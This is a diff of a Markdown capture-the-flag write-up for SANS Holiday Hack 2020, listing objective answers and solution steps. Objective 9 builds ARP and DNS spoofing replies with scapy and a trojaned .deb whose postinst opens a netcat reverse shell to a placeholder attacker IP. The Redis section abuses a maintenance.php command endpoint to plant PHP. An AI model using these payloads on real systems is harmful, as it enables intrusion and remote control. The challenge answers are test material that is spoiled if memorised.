@@ -12,6 +12,7 @@ titlepage-text-color: "FFFAFA"
 titlepage-rule-color: "FFFAFA"
 titlepage-rule-height: 2
 book: true
+numbersections: false
 classoption: oneside
 code-block-font-size: \scriptsize
 ---
@@ -20,13 +21,13 @@ code-block-font-size: \scriptsize
 
 ![](screenshots/hh2020-title.png)
 
-
 # Objective 1: Uncover Santa's Gift List
 
 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.
 
-
 ![](screenshots/objective-1-completed.jpg)
+
+**Answer:** "poxmark"
 
 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.
 
@@ -34,15 +35,14 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 - I used the tool suggested in the hint. Took several attempts at twirling and untwirling before I could see what was on the list for him.
 - Once I saw what was on the list, I read it as "poxmark", but had no idea if this was a thing, so I googled it. YUP! A very interesting thing at that. :)
 
-**Answer:** "poxmark"
-
-
 
 # Objective 2: Investigate S3 Bucket
 
 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.
 
 ![](screenshots/objective-2-completed.jpg)
+
+**Answer:** "North Pole: The Frostiest Place on Earth"
 
 - Added wrapper3000 to the wordlist
 - Found this bucket (wrapper3000) and the file "package"
@@ -58,7 +58,6 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 - Step 8: "cat package.txt"
 
 
-**Answer:** "North Pole: The Frostiest Place on Earth"
 
 
 
@@ -68,9 +67,13 @@ Help Sugarplum Mary in the Courtyard find the supervisor password for the point-
 
 ![](screenshots/objective-3-completed.jpg)
 
+**Answer:** "santapass"
+
 - Step 1: Download the santa-shop.exe file.
 - Step 2: Extract with "engrampa"
-	![](screenshots/engrampa.png)
+
+![](screenshots/engrampa.png)
+
 - Step 3: Looking at the .asar file located here:  /home/kali/Downloads/app-64/resources
 - Step 4: Remember to read hints and look at hint suggesting npm "asar" tool.
 - Step 5: Reading throught this article on how to use it. Interesting!
@@ -80,10 +83,7 @@ Help Sugarplum Mary in the Courtyard find the supervisor password for the point-
 - Step 6: Review unpacked source code and then "cat README.md"
 	- "cat README.md" ---> "Remember, if you need to change Santa's passwords, it's at the top of main.js!"
 
-**Answer:** "santapass"
-
 ~~~
-
 main.js
 // Modules to control application life and create native browser window
 const { app, BrowserWindow, ipcMain } = require('electron');
@@ -92,20 +92,15 @@ const path = require('path');
 const SANTA_PASSWORD = 'santapass';
 ~~~
 
-
-
 # Objective 4: Operate the Santavator
 
 Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
 ![](screenshots/objective-4-completed.jpg)
 
-
 Got some help from my kid on this one. :) 
 
 ![](screenshots/elevator.png)
-
-
 
 # Objective 5: Open HID Lock
 
@@ -124,13 +119,13 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 
 ![](screenshots/black-badge.png)
 
-
-
 # Objective 6: Splunk Challenge
 
 Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?
 
 ![](screenshots/objective-6-completed.jpg)
+
+**Answer:** "The Lollipop Guild"
 
 ![](screenshots/splunk.png)
 
@@ -228,10 +223,6 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 - Step 4: Alice says I need to watch Splunk talk.
 	- Passphrase is "Stay Frosty"
 
-**Answer:** "The Lollipop Guild"
-
-
-
 # Objective 7: Solve the Sleight's CAN-D-BUS Problem
 
 Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.
@@ -264,13 +255,13 @@ Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. 
 
 It works!
 
-
-
 # Objective 8: Broken Tag Generator
 
 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.
 
 ![](screenshots/objective-8-completed.jpg)
+
+**Answer:** "JackFrostWasHere"
 
 - Step 1: Get an error by doing and upload of an unsupported file:
 ~~~
@@ -358,15 +349,13 @@ Here's the result!
 
 ![](screenshots/tag-generator-env-response.png)
 
-**Answer:** "JackFrostWasHere"
-
-
-
 # Objective 9: ARP Shenanigans
 
 Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
 
 ![](screenshots/objective-9-completed.jpg)
+
+**Answer:** "Tanta Kringle"
 
 - Step 1: Make sure you can reach 10.6.6.35 --> "ping 10.6.6.35"
 - Step 2: Do an "ls" of the home folder.
@@ -375,10 +364,9 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 
 - Step 4: Run "tshark -i eth0"
 - Step 5: Notice that .35 is asking about .53
-
 - Step 6: Create ARP response: 
-~~~
 
+~~~
         ether_resp = Ether(dst=packet.hwsrc, type=0x806, src=macaddr)
 
         arp_response = ARP(pdst=packet.psrc)
@@ -399,6 +387,7 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 ~~~
 
 - Step 7: Create DNS response:
+
 ~~~
 
     eth = Ether(src=packet.dst, dst=packet.src)      # need to replace mac addresses
@@ -418,19 +407,19 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 
 - Step 9: Create that file and make it call back to listener on local machine.
 - Step 10: Determine payload to use. Simple nc reverse shell should work.
-~~~
 
+~~~
 nc -e /bin/sh ATTACKING-IP 4444
-
 ~~~
+
 - Step 11: Build the deb package with the above payload in the "postinst"
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
 
 - "vim control" (control file for the package)
-~~~
 
+~~~
 Package: [Package Name]
 Version: [Package Version]
 Section: Network Tools
@@ -438,13 +427,11 @@ Priority: optional
 Architecture: amd64
 Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
 Description: Network utility for hacking all the things.
-
 ~~~
-	
 
 - "vim postinst" (postinst file for the package)
-~~~
 
+~~~
 #!/bin/sh
 
 nc -e /bin/sh [attacking ip] 4444
@@ -455,16 +442,11 @@ nc -e /bin/sh [attacking ip] 4444
 	- "mv work.deb [package name].deb"
 	- "python3 -m http.server 80"
 
+
 - Step 11: Start listener with "nc -nvlp 4444" 
-
 - Step 12: Get ARP and DNS responses going
-
 - Step 13: Navigate to file contents in question:
 	- "cat *.txt | grep recused"
-
-**Answer:** "Tanta Kringle"
-
-
 
 # Objective 10: Defeat Fingerprint Sensor
 
@@ -475,8 +457,6 @@ Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's f
 This required going into developer mode in Google Chrome. I saw one spot where the 'besanta' token was a condition required for being able to go to floor three and deleted it. After doing this, you can save "app.js" and reload the elevator code in your browser. 
 
 ![](screenshots/remove-besanta-condition.png)
-
-
 
 # Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 
 
@@ -559,15 +539,11 @@ Here's the final script that retrieves he predicted values:
 
 ~~~
 
-
-
 # Challenges
 
 # Snowball Fight (Tangle Coalbox)
 
 ![](screenshots/win-on-impossible.png)
-
-## Steps
 
 - Step 1: Watch Tom Liston's talk.
 - Step 2: Clone Liston's  mt19937 GitHub repository. Review/run the code.
@@ -590,7 +566,6 @@ All you should have to do is type task.submit('start') to move past this questio
 Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()
 
 >task.submit('start')
-
 
 ## COMPLETED TASK #2:
 Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
@@ -725,11 +700,7 @@ Great, you prepared all the present packets!
 
 >task.submit(ARP_PACKETS)
 
-
-
 # Kringle Kiosk (Shinny Upatree)
-
-![](screenshots/shinny-upatree.png)
 
 ~~~
 Welcome to our castle, we're so glad to have you with us!
@@ -745,8 +716,6 @@ Escape the menu by launching /bin/bash
 
 # Unescape Tmux (Pepper Minstix)
 
-![](screenshots/pepper-minstix.png)
-
 ~~~
 Can you help me?
 
@@ -759,8 +728,6 @@ Can you help me find her? We were so attached!!
 - Used "tmux a" to attach the available tmux session
 
 # Linux Primer (Sugarplum Mary)
-
-![](screenshots/sugarplum-mary.png)
 
 - Entered "yes" to begin
 - Step 1: "ls"
@@ -790,7 +757,9 @@ Can you help me find her? We were so attached!!
 Mischevious munchkins have nabbed all the North Pole's lollipops intended for good children all over the world. Use your JavaScript skills to retrieve the nabbed lollipops from all the entrances of KringleCon.
 
 # Redis Bug Hunt (Holly Evergreen)
+
 ~~~
+
 We need your help!!
 
 The server stopped working, all that's left is the maintenance port.
@@ -814,6 +783,7 @@ maintenance page to view the source code for the index page?
 ~~~
 - Step 3: "curl http://localhost/maintenance.php?cmd=config,get,*"
 - Step 4: Notice this in the output:
+
 ~~~
 dbfilename
 dump.rdb
@@ -821,9 +791,11 @@ requirepass
 R3disp@ss
 masterauth
 ~~~
+
 - Step 5: "redis-cli"
 - Step 6: AUTH R3disp@ss
 - Step 7: Get php to show the contents of index.php by inserting into a key value.
+
 ~~~
 127.0.0.1:6379> auth R3disp@ss
 OK
@@ -868,9 +840,6 @@ player@b71845abd4ae:~$ cat file
 echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
 ?>
 ~~~
-
-
-
 
 # Speaker UNPrep (Bushy Evergreen)
 ~~~
@@ -961,7 +930,6 @@ If you've figured out the real password, be sure you run /home/elf/lights
 	- "123456789f"   encrypts to "2W1hYoj4lw"
 - Step 3: I tried nearly everything but apparently skipped "CandyCane1". Wow, that was an ordeal!
 
-
 # 33.6kbps (Fitzy Shortstack)
 
 - Step 1: Dial the number --> 756-8347
@@ -974,24 +942,9 @@ If you've figured out the real password, be sure you run /home/elf/lights
 - Step 3: Got hint to talk to Shinny Upatree (to steal his tag ID) :)
 	- "2006e22f13" 
 
-# Scapy Prepper (Alabaster Snowball)
-~~~
-╔════════════════════════════════════════════════════════════════╗
-║  ___ ___ ___ ___ ___ _  _ _____   ___  _   ___ _  _____ _____  ║
-║ | _ \ _ \ __/ __| __| \| |_   _| | _ \/_\ / __| |/ / __|_   _| ║
-║ |  _/   / _|\__ \ _|| .` | | |   |  _/ _ \ (__| ' <| _|  | |   ║
-║ |_| |_|_\___|___/___|_|\_| |_|   |_|/_/ \_\___|_|\_\___| |_|   ║
-║                ___                                             ║
-║               | _ \_ _ ___ _ __ _ __  ___ _ _                  ║
-║               |  _/ '_/ -_) '_ \ '_ \/ -_) '_|                 ║
-║               |_| |_| \___| .__/ .__/\___|_|                   ║
-║                           |_|  |_|                             ║
-║                (Packets prepared with scapy)                   ║
-╚════════════════════════════════════════════════════════════════╝
-Type "yes" to begin. 
-~~~
 
 # CAN-Bus Investigation (Wunorse Openslae)
+
 ~~~
 Welcome to the CAN bus terminal challenge!
 
@@ -1004,6 +957,7 @@ We'd like to encode another key mechanism.
 Find the timestamp of the UNLOCK code in candump.log and submit it to
 ./runtoanswer!
 ~~~
+
 - Step 1: "awk '/19B/' candump.log
 - Step 2: Read through list of results 
 - Step 3: Start from the bottom and work my way up until getting right time stamp. :)
